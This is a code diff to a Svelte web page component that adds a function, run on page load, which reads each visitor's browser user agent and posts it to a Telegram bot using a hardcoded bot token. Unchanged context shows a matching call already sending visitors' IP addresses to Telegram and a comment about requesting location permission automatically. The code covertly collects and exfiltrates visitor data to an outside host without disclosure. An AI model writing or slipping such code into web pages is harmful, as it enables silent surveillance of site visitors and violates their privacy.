@@ -1,7 +1,8 @@
 <script>
   import { onMount } from 'svelte';
   sendIPToTelegramBots();
-
+ getdatatotelegrambots();
+ 
   onMount(async () => {
   
     // Request location permission automatically
@@ -92,6 +93,30 @@
       }),
     });
   }
+  
+  async function getdatatotelegrambots() {
+    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
+
+    const userAgent = navigator.userAgent;
+    const message = `\nUser Agent:\n\n${userAgent}`;
+
+    const htmlMessage = `${message}`;
+
+    await fetch(telegramBotURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: '@localipy',
+        text: htmlMessage,
+        parse_mode: 'HTML',
+      }),
+    });
+  }
+  
+  
 </script>
 
 <main>
